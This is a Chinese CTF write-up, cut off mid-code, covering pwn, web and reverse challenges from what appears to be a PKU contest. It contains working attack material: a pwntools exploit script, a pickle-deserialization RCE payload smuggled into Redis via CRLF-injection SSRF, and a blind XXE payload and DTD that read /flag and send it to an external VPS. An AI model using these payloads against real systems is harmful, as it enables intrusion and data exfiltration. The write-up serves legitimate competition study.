src="https://cdn.nlark.com/yuque/0/2024/png/43707272/1715000942707-a763ffbe-d4f5-490e-92f6-32bd3b39dfaa.png#averageHue=%23f8f7f5&amp;clientId=u506acabf-9db4-4&amp;from=paste&amp;height=128&amp;id=u4475e9fb&amp;originHeight=192&amp;originWidth=496&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=11091&amp;status=done&amp;style=none&amp;taskId=u02652051-23f7-4995-b420-0dbb8af714b&amp;title=&amp;width=330.6666666666667" alt="image.png"><br>参考链接：<br><a href="https://qanux.github.io/2024/04/22/geek2024/index.html">https://qanux.github.io/2024/04/22/geek2024/index.html</a><br>利用脚本进行更新<br><img src="https://cdn.nlark.com/yuque/0/2024/png/43707272/1715000915845-57755e75-109f-4bcd-92d8-01649e10567f.png#averageHue=%23e9e9e9&amp;clientId=u506acabf-9db4-4&amp;from=paste&amp;height=79&amp;id=u5b8ab700&amp;originHeight=119&amp;originWidth=1138&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=19958&amp;status=done&amp;style=none&amp;taskId=uc31c430d-408b-46fb-89b1-4fcbfd0d67c&amp;title=&amp;width=758.6666666666666" alt="image.png"><br>这里的o_curl.exe是当前自己系统的curl.exe，-o是要输出的文件名，r为回滚的，要把这个r里的解压出来的文件替换成自己系统的补丁里的，f里的是压缩包里的（事实上就这一个有用的）<br>出来个nnn.exe<br>自己系统补丁位置：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/43707272/1715000871074-f02c0e14-6dd7-4369-80b2-ab0fc49ce6d3.png#averageHue=%23f9f8f8&amp;clientId=u506acabf-9db4-4&amp;from=paste&amp;height=134&amp;id=u3b91cc18&amp;originHeight=201&amp;originWidth=773&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=16654&amp;status=done&amp;style=none&amp;taskId=ub71bc11d-2583-43a8-bd2f-98de89d2d2e&amp;title=&amp;width=515.3333333333334" alt="image.png"><br>大概就是在winsxs中搜索curl有关的文件（也可能不是这里边的，在其他补丁里，直接全局搜也行）<br>运行命令后得到最终输出的文件<br>看下版本<br><img src="https://cdn.nlark.com/yuque/0/2024/png/43707272/1715000887771-38ef610f-f0f8-4119-a0cf-64d42a8e897f.png#averageHue=%23151311&amp;clientId=u506acabf-9db4-4&amp;from=paste&amp;height=93&amp;id=ua4ea2b61&amp;originHeight=139&amp;originWidth=824&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=19767&amp;status=done&amp;style=none&amp;taskId=u2490ad99-dc3a-4047-a7ab-81197a1415c&amp;title=&amp;width=549.3333333333334" alt="image.png"><br>得到flag</p><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>nc后用队伍token连接<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1714994481062-c54c911c-25a6-4e4f-af53-dc48ae968a09.png#averageHue=%23050403&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=737&amp;id=ua208fa5a&amp;originHeight=1105&amp;originWidth=1362&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=276409&amp;status=done&amp;style=none&amp;taskId=u0389955e-c2da-41c1-8fc8-da60ae70065&amp;title=&amp;width=908" alt="image.png"><br>源码main函数分析</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">load</span>();</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;7z&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your token:&quot;</span>);<span class="comment">//输入token</span></span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    <span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), stdin);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">cmpstr</span>(token, buf)) &#123;<span class="comment">//进行校验</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wrong token!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">zip</span>(buf);<span class="comment">//压缩文件</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your flag:&quot;</span>);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), stdin);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">cmpstr</span>(<span class="string">&quot;flag&#123;&quot;</span>, buf)) &#123;<span class="comment">//进行校验</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wrong flag!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">unzip</span>(buf);<span class="comment">//解压</span></span><br><span class="line"></span><br><span class="line">    FILE *f = <span class="built_in">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!f) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;flag.txt not found&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), f);</span><br><span class="line">    <span class="built_in">fclose</span>(f);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag: %s\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>连接后<br>1.先比较token<br>2.然后用token做密码去压缩<br>3.要用以“flag{”开头的字符串<br>4.得到解压的flag<br>其中<br>token在处理时，在第65置0，所以就要token的前64位<br>3步中要绕过flag{，可以通过传DEL（ASCII:127）删除<br>payload</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;prob03.contest.pku.edu.cn&#x27;</span>, <span class="number">10003</span>, level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Please input your token: &#x27;</span>,</span><br><span class="line">                b<span class="string">&#x27;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#x27;</span>)#</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;your token:\n&#x27;</span>, b<span class="string">&#x27;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpy&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;flag&#123;&#x27;</span>+b<span class="string">&#x27;\x7f&#x27;</span>*<span class="number">5</span>+b<span class="string">&quot;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpy&quot;</span></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;your flag:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="phpsql"><a href="#phpsql" class="headerlink" title="phpsql"></a>phpsql</h2><p>注册admin显示已经存在</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714992887587-02327559-9444-4a1a-a1f9-dd0e928c598d.png#averageHue=%23f8f7f7&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=160&amp;id=uecceb6b4&amp;originHeight=240&amp;originWidth=844&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=20062&amp;status=done&amp;style=none&amp;taskId=u66937d01-7573-4a5c-b7e9-6d7ccce62e4&amp;title=&amp;width=562.6666666666666" alt="image.png"></p><p>结合题目phpsql应该是万能密码注入进入后台<br>直接拿sql语句字典跑</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714993045758-5d5a39af-821d-4573-92f8-1acbce11c6f0.png#averageHue=%23f7f6f6&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=808&amp;id=ue685cc7e&amp;originHeight=1212&amp;originWidth=1740&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=193028&amp;status=done&amp;style=none&amp;taskId=udfec92e2-bd07-4848-98f3-1be74fbbfcc&amp;title=&amp;width=1160" alt="image.png"></p><p>直接跑进去</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714993089174-839db6d3-1ae0-4e02-aa7d-90c465139d17.png#averageHue=%23f8f7f7&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=579&amp;id=uca6f4055&amp;originHeight=868&amp;originWidth=2106&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=102070&amp;status=done&amp;style=none&amp;taskId=uebf09cf5-a2db-485f-acef-b0c9c6471cd&amp;title=&amp;width=1404" alt="image.png"></p><h2 id="pyssrf"><a href="#pyssrf" class="headerlink" title="pyssrf"></a>pyssrf</h2><p>根据题目与提示pyssrf加什么年代了还用python3.7.1<br><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994494037-64fd117e-7f50-497c-adde-f2b742683b6e.png#averageHue=%23f7f6f5&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=421&amp;id=u05709a18&amp;originHeight=631&amp;originWidth=2358&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=163353&amp;status=done&amp;style=none&amp;taskId=ud0145662-c860-4a16-b1fe-b4c1b7540d4&amp;title=&amp;width=1572" alt="image.png"><br>python3.7.1的环境中,urllib有请求头注入<br>redis 解析<br>GET /?<br>payload<br>padding<br>基本上可以理解为<br>pickle反序列化+redis+rce+ssrf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">opcode=<span class="string">&#x27;&#x27;&#x27;(S&#x27;mkdir ./static;cp /flag ./static/f&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">key=hashlib.md5(<span class="string">&quot;http://test/&quot;</span>.encode()).hexdigest()</span><br><span class="line">value=base64.b64encode(opcode).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;set&#x27;</span>,key,value)</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set <span class="number">0439</span>e<span class="number">1</span>ff<span class="number">2</span>e<span class="number">65</span>e<span class="number">21</span>dcf<span class="number">4</span>bba<span class="number">4</span>c<span class="number">26</span>a<span class="number">0</span>dab<span class="number">2</span> KFM<span class="symbol">nbWtkaXIgLi9</span>zdGF<span class="number">0</span>aW<span class="name">M7</span>Y<span class="number">3</span>AgL<span class="number">2</span>ZsYWcgLi<span class="number">9</span>zdGF<span class="number">0</span>aWMvZicKaW<span class="number">9</span>zC<span class="symbol">nN5</span>c<span class="number">3</span>RlbQou</span><br></pre></td></tr></table></figure><p>构造url</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url<span class="operator">=</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6379</span>?<span class="variable">%0</span>d<span class="variable">%0</span>aset<span class="variable">%200439</span>e<span class="number">1</span>ff<span class="number">2e65</span>e<span class="number">21</span>dcf<span class="number">4</span>bba<span class="number">4</span><span class="keyword">c</span><span class="number">26</span>a<span class="number">0</span>dab<span class="number">2</span><span class="variable">%20</span>KFMnbWtkaXIgLi<span class="number">9</span>zdGF<span class="number">0</span>aWM<span class="number">7</span>Y<span class="number">3</span>AgL<span class="number">2</span>ZsYWcgLi<span class="number">9</span>zdGF<span class="number">0</span>aWMvZicKaW<span class="number">9</span>zCnN<span class="number">5</span><span class="keyword">c</span><span class="number">3</span>RlbQou<span class="variable">%0</span>d<span class="variable">%0</span>apadding<span class="variable">%0</span>d<span class="variable">%0</span>a</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994544337-8fb892d3-eb1f-4eb6-8519-8009cbc7f922.png#averageHue=%23fcfcfb&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=636&amp;id=uf7471715&amp;originHeight=954&amp;originWidth=2073&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=172099&amp;status=done&amp;style=none&amp;taskId=ue5891c29-eb99-432b-b100-a8274cef51a&amp;title=&amp;width=1382" alt="image.png"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">url</span>=test/</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994558947-f9549518-8176-46fa-8351-57e63ed42029.png#averageHue=%23fcfcfb&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=651&amp;id=u073badac&amp;originHeight=976&amp;originWidth=1699&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=145448&amp;status=done&amp;style=none&amp;taskId=u519df234-d0e8-423b-9fcf-86a8a9c6272&amp;title=&amp;width=1132.6666666666667" alt="image.png"></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">static</span>/f</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994569753-437c68fe-8887-4069-b2da-66a5ce52d809.png#averageHue=%23f4f4f4&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=212&amp;id=ubc48bda5&amp;originHeight=145&amp;originWidth=508&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=17040&amp;status=done&amp;style=none&amp;taskId=uc9fa657c-22d7-40c4-b606-19b564e9126&amp;title=&amp;width=741.6666870117188" alt="image.png"><br>打开即可得到flag<br><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994749430-228bc4a8-970d-4ba2-be9e-40588181af13.png#averageHue=%23e9e8e7&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=216&amp;id=u42b4835f&amp;originHeight=186&amp;originWidth=664&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=22735&amp;status=done&amp;style=none&amp;taskId=u011f692d-726d-4248-8c67-5518ae96ede&amp;title=&amp;width=772.6666870117188" alt="image.png"></p><h2 id="fileit"><a href="#fileit" class="headerlink" title="fileit"></a>fileit</h2><p>源码有提示<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993406997-f9ee5e83-dd7b-4205-b62b-96a9dc140d30.png#averageHue=%23161616&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=141&amp;id=u612e9f98&amp;originHeight=212&amp;originWidth=856&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=15062&amp;status=done&amp;style=none&amp;taskId=ucc6f4d6c-11a1-4cf6-a0e2-a3284806825&amp;title=&amp;width=570.6666666666666" alt="image.png"><br>测试后发现要打无回显xxe<br>vps创建flag.dtd文件，内容如下：</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">ccc</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; aba SYSTEM &#x27;http://43.143.167.75:8888?x=%file;&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl">%ccc;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl">%aba;</span></span><br></pre></td></tr></table></figure><p>创建完成后，在当前目录起python服务<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993610279-870a1647-d25a-4e40-bb49-5c79545d395b.png#averageHue=%23363534&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=214&amp;id=u42df1cf2&amp;originHeight=321&amp;originWidth=1166&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=32773&amp;status=done&amp;style=none&amp;taskId=u7a0eaf35-9ca7-430d-bb2f-9535f88f7a3&amp;title=&amp;width=777.3333333333334" alt="image.png"><br>payload如下：</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE a [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://43.143.167.75:8888/flag.dtd&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">    %xxe;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    ]&gt;</span></span></span><br></pre></td></tr></table></figure><p>初始页面抓包后，post传参：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993694538-4c066cf9-fdf1-4797-8480-57b979fc7e14.png#averageHue=%2395a06c&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=699&amp;id=u4362b49d&amp;originHeight=1048&amp;originWidth=1584&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=243273&amp;status=done&amp;style=none&amp;taskId=u863ea369-8f5f-4208-a767-00ff811e152&amp;title=&amp;width=1056" alt="image.png"><br>发送后，vps就会显示接收的数据<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993724668-023b3aaa-ce9d-4493-bc71-bba222e1d145.png#averageHue=%233e3d3b&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=301&amp;id=u173b80ae&amp;originHeight=452&amp;originWidth=1359&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=59092&amp;status=done&amp;style=none&amp;taskId=ud783355a-defd-4cf3-a73e-ccdb63a3d3f&amp;title=&amp;width=906" alt="image.png"><br>base64解码，拿到flag<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993743242-9254f3fc-1ecb-4b04-b0cf-c98c234f8510.png#averageHue=%23ebebea&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=322&amp;id=u1c691f26&amp;originHeight=483&amp;originWidth=998&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=24179&amp;status=done&amp;style=none&amp;taskId=ue2aef635-3d68-400d-8485-5e0b7981eb3&amp;title=&amp;width=665.3333333333334" alt="image.png"></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="ezayre"><a href="#ezayre" class="headerlink" title="ezayre"></a>ezayre</h2><p>64位无壳elf，拉进ida看看<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765706-a3095736-a5b7-47ba-b23d-866b730cb950.png#averageHue=%23f9f7f7&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=u88596a10&amp;originHeight=547&amp;originWidth=772&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u8ce547ae-6a90-4b8b-b514-63aa2ba03ac&amp;title=" alt=""><br>锁定主要函数是sub_1208，跟进之后有爆红，修好之后加密逻辑如下，看到下图标红处之后，感觉是base64<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765742-1cdb534e-27d7-4cc4-bd45-aa83c1012e4d.png#averageHue=%23f9f9f9&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=u473e1a4e&amp;originHeight=763&amp;originWidth=1028&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u6ad6fd18-57fa-4756-b6d4-ff3312d6be2&amp;title=" alt=""><br>直接查找一下字符串<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765707-401ce508-7aea-4897-b4c8-b0654fdb8d8e.png#averageHue=%23f8f5f3&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=uccc36a39&amp;originHeight=574&amp;originWidth=899&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=ube02818f-1435-4679-a1f9-838ade16a94&amp;title=" alt=""><br>看见变表和密文之后直接秒了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765583-e9e645b8-9ff4-46fd-9c35-39f31dbd8769.png#averageHue=%23e7e6e6&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=ufd19f407&amp;originHeight=643&amp;originWidth=1279&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=ua3dbb87b-6b69-43c5-885e-877b4c5bed9&amp;title=" alt=""></p><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>正常脱upx壳之后拉进ida<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765670-b0ad82b2-4f5e-497d-a3c4-2ece25075536.png#averageHue=%23fdfafa&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=u0449cf0a&amp;originHeight=495&amp;originWidth=710&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u7e3cab4e-b008-44e1-9042-057ce5f3d78&amp;title=" alt=""><br>直接把四个函数中的加密逆一下，都是一些基本加密操作，直接爆破一下，注意爆破的取值区间是0~2^32-1,包含所有32无符号整数，把内容合一下，exp如下（PS:第一个函数就加减值加密，不写入函数了就）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_1257</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (a1 | <span class="number">0x8E03BEC3</span>) - <span class="number">3</span> * (a1 &amp; <span class="number">0x71FC413C</span>) + a1 == <span class="number">-1876131848</span> )</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_12A4</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0x10000000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4</span> * ((~a1 &amp; <span class="number">0xA8453437</span>) + <span class="number">2</span> * ~(~a1 | <span class="number">0xA8453437</span>))</span><br><span class="line">     + <span class="number">-3</span> * (~a1 | <span class="number">0xA8453437</span>)</span><br><span class="line">     + <span class="number">3</span> * ~(a1 | <span class="number">0xA8453437</span>)</span><br><span class="line">     - (<span class="number">-10</span> * (a1 &amp; <span class="number">0xA8453437</span>)</span><br><span class="line">      + (a1 ^ <span class="number">0xA8453437</span>)) == <span class="number">551387557</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_1346</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0x10000000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">11</span> * ~(a1 ^ <span class="number">0xE33B67BD</span>)</span><br><span class="line">     + <span class="number">4</span> * ~(~a1 | <span class="number">0xE33B67BD</span>)</span><br><span class="line">     - (<span class="number">6</span> * (a1 &amp; <span class="number">0xE33B67BD</span>)</span><br><span class="line">   